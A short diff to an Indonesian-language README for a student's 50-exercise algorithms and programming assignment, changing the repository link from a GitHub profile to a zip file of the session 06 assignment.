@@ -23,4 +23,4 @@ Proyek ini berisi pengerjaan 50 soal Algoritma dan Pemrograman yang mencakup pen
 
 ## Tautan Repositori
 
-Lihat dan pantau repositori GitHub di [https://github.com/Choirunnisa250308](https://github.com/Choirunnisa250308).
+Lihat dan pantau repositori GitHub di [https://github.com/Choirunnisa250308/Choirunnisa250308.github.io/blob/main/public/choirunnisa%20tugas%20Algoritma%20pertemuan%2006.zip].
